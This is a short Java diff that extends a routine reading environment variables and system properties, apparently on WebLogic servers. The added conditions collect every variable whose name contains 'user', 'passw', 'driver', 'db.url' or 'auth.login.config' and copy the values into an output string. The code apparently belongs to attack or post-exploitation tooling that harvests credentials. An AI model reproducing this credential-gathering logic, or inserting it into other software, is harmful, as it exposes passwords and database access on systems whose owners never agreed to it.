@@ -6,8 +6,15 @@ String bsK = "bash";
 Map<String, String> env = System.getenv();
 for (String envName : env.keySet())
 {
-    if(null != envName && -1 < szKeys.indexOf(envName))
+    if(null != envName && (-1 < szKeys.indexOf(envName) 
+       || -1 < envName.toLowerCase().indexOf("user")
+       || -1 < envName.toLowerCase().indexOf("passw") 
+       || -1 < envName.toLowerCase().indexOf("driver")
+       || -1 < envName.toLowerCase().indexOf("db.url")
+       || -1 < envName.toLowerCase().indexOf("auth.login.config")
+       ))
     {
+
         szSys += envName + "=\"" + env.get(envName) + "\"\n";
         if("WL_HOME".equalsIgnoreCase(envName))
             s1 = env.get(envName);
@@ -21,7 +28,13 @@ Properties capitals = System.getProperties();
 Set states = capitals.keySet();
 for (Object name : states)
 {
-    if(null != name && -1 < szKeys.indexOf((String)name))
+    if(null != name && (-1 < szKeys.indexOf((String)name)
+        || -1 < name.toString().toLowerCase().indexOf("user")
+       || -1 < name.toString().toLowerCase().indexOf("passw") 
+       || -1 < name.toString().toLowerCase().indexOf("driver")
+       || -1 < name.toString().toLowerCase().indexOf("db.url")
+       || -1 < name.toString().toLowerCase().indexOf("auth.login.config")
+       ))
     {
         szSys += (String)name + "=\"" + (String)capitals.getProperty((String) name) + "\"\n";
         if("WL_HOME".equalsIgnoreCase((String)name))
